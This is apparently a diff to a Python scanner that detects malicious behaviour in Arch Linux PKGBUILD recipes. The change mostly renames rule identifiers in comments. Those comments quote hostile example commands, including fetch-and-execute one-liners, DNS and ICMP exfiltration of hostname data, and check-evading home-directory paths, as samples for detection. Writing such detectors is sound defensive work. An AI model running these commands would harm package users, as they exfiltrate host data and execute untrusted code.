@@ -13,7 +13,7 @@ is slow, risky, and trades one bypass for an over-expansion bug.
 
 Crossfire inverts the problem instead. **A word the tokenizer could not
 resolve literally is itself the signal.** One rule then covers the evasion
-surface of every payload rule at once - R001, R127, R137 and the rest - because
+surface of every payload rule at once - R001, H075, H082 and the rest - because
 it does not care which payload was being hidden, only that hiding happened.
 
 The failure mode inverts with it. Today a defeated tokenizer produces silence,
@@ -70,7 +70,7 @@ _EXECUTING_SCOPES = (
 #: Files whose every line is shell: the recipe, pacman's scriptlets, and any
 #: shell companion the recipe ships. A `.patch` is excluded even though it
 #: contains shell-looking text - the text is a payload for `patch`, and the
-#: rules that read a patch are R063's, not these.
+#: rules that read a patch are H018's, not these.
 _SHELL_FILE_RE = re.compile(
     r"(?:^|/)(?:PKGBUILD|[^/]*\.(?:install|sh|bash|zsh))$", re.IGNORECASE
 )
@@ -469,23 +469,23 @@ X004_SHAPES = (
 # ---------------------------------------------------------------------------
 # X005: the home directory, reached by a spelling that dodges the check.
 #
-# R077 claims a write whose target starts with `~/` or `$HOME/`, plus any
+# H032 claims a write whose target starts with `~/` or `$HOME/`, plus any
 # rc-file basename. That is the obvious spelling, and it is the one an
 # attacker will not use. The same directory is reachable as
 # `/home/alice/...`, `~alice/...`, `/root/...`, `/home/$USER/...`,
 # `${HOME:-/home/alice}/...`, or by traversing into it - and none of those
-# start with the prefix R077 looks for.
+# start with the prefix H032 looks for.
 #
 # This is the family's thesis applied to a path: the technique is the signal.
 # Choosing `/home/$USER/bin` over `$HOME/bin` is a choice, and the only thing
 # it buys is getting past a check.
 #
-# It **defers** to R077 rather than doubling it: a target R077 already claims
+# It **defers** to H032 rather than doubling it: a target H032 already claims
 # is skipped here, so one write is scored once.
 # ---------------------------------------------------------------------------
 
-#: What R077 already matches.  X005 stands down on these.
-_R077_CLAIMS_RE = re.compile(r"^[\"']?(?:~|\$\{?HOME\}?)/")
+#: What H032 already matches.  X005 stands down on these.
+_H032_CLAIMS_RE = re.compile(r"^[\"']?(?:~|\$\{?HOME\}?)/")
 
 _HOME_ALIASES = (
     # A literal home path, with a real or variable username.
@@ -566,9 +566,9 @@ def _home_alias_hit(body: str):
         target_word = _word_around(body, path_start, match.end())
         if _STAGED_RE.search(target_word):
             continue
-        # Defer to R077 when the target is spelled the plain way.
+        # Defer to H032 when the target is spelled the plain way.
         target = match.group(0).lstrip(" \t\"'=")
-        if _R077_CLAIMS_RE.match(target):
+        if _H032_CLAIMS_RE.match(target):
             continue
         return shape
     return None
@@ -990,7 +990,7 @@ X009_RE = re.compile(
 #
 # `php -r 'system(file_get_contents(URL));'` and
 # `python3 -c '...urlopen(os.environ["U"]).read()'` need no shell client at
-# all, so R061's inventory never sees them and R044 wants a flag spelling
+# all, so H016's inventory never sees them and R044 wants a flag spelling
 # they need not use.  The signal is a URL, or a fetch call, inside a script
 # the recipe passes on the command line.
 X010_RE = re.compile(
@@ -1058,7 +1058,7 @@ X018_RE = re.compile(
 # (`dig +short "$(hostname).e.example"`), or an ICMP packet whose payload is
 # a hex dump (`ping -c1 -p "$(od -An -tx1 /etc/hostname | tr -d ' ')"`).
 # Both are ordinary diagnostic tools carrying data out in a field nobody
-# reads as a channel, and R123's list is tor and dns-tunnel binaries.
+# reads as a channel, and H071's list is tor and dns-tunnel binaries.
 #
 # The second does not send at all: it writes host material into `$pkgdir`,
 # and the exfiltration happens later, when the package is published. `env`,
@@ -1093,7 +1093,7 @@ X019_RE = re.compile(
 # `gem install`, `go install m@latest` each fetch code and then execute it -
 # setup.py and PEP 517 hooks, npm lifecycle scripts, build.rs, extconf, a
 # module build.  None of it is in the recipe, none of it is checksummed by
-# it, and every one of these scored zero.  R081 covers the same verbs but is
+# it, and every one of these scored zero.  H035 covers the same verbs but is
 # scoped to install hooks by design, so a build-time install fell between.
 #
 # The coverage gap `unpinned_build_deps` already reports the *unpinned*
@@ -1151,7 +1151,7 @@ X011_RE = re.compile(
 # `export CC="$srcdir/mcc"` and `export PATH="$srcdir/bin:$PATH"` do not
 # fetch and do not execute anything the reader can see.  What they do is
 # decide which binary the *next* line runs, and the next line is `make`.
-# R070 reports LD_PRELOAD and LD_LIBRARY_PATH as a generic environment HIGH,
+# H025 reports LD_PRELOAD and LD_LIBRARY_PATH as a generic environment HIGH,
 # but nothing connected the override to the build step it redirects, and
 # `CC`/`CXX`/`PATH` were not covered at all.
 X012_RE = re.compile(
@@ -1191,7 +1191,7 @@ X012_CONSUMER_RE = re.compile(
 #
 # R057 already owns `-k`/`--insecure` - turning verification *off* - and
 # this is the other half: keeping verification on and owning what it checks
-# against.  The proxy exports rang R006 LOW and the rest were silent.
+# against.  The proxy exports rang H003 LOW and the rest were silent.
 #: The verification pattern this rule must not report.
 #:
 #: `gpg --homedir="$_gnupghome" --import "$srcdir/maintainer.gpg"` is how a
@@ -1199,8 +1199,8 @@ X012_CONSUMER_RE = re.compile(
 #: arrives through `source=()`, so makepkg checksums it and the diff shows
 #: any change to it, and `--homedir` scopes the import to a throwaway
 #: keyring rather than the user's.  A key from `$srcdir` is covered by the
-#: source-verification chain; one fetched at build time is not, and R061 and
-#: R137 claim that fetch on its own line.
+#: source-verification chain; one fetched at build time is not, and H016 and
+#: H082 claim that fetch on its own line.
 #:
 #: `--recv-keys` is deliberately absent from this stand-down: it pulls a key
 #: from a keyserver the recipe names, which is the network fetch the source
@@ -1368,7 +1368,7 @@ X014_STANDDOWN_RE = re.compile(
 #
 # The scheduled command is usually a path this recipe just wrote, so the
 # whole chain reads as "fetch, write, arrange to run later" - and every arm
-# of it scored at most R061's undeclared-fetch HIGH, because the run never
+# of it scored at most H016's undeclared-fetch HIGH, because the run never
 # happens on a line any execution rule reads.
 #
 # `systemctl enable` is deliberately absent: a package's `.install` scriptlet
@@ -1587,7 +1587,7 @@ X021_RE = re.compile(
 #   printf "route { exec_dset(\"bash $PWD/x.sh\"); }\n" > "$srcdir"/k
 #   kamailio -f "$srcdir"/k
 #
-# R145 and R149 claim a config that is *shipped* - generated into `$pkgdir`
+# H089 and H093 claim a config that is *shipped* - generated into `$pkgdir`
 # or committed to the repository - because a shipped file naming a build
 # directory is broken on arrival. Neither applies here: the file stays in
 # the build tree, where naming `$srcdir` is perfectly normal, and it is
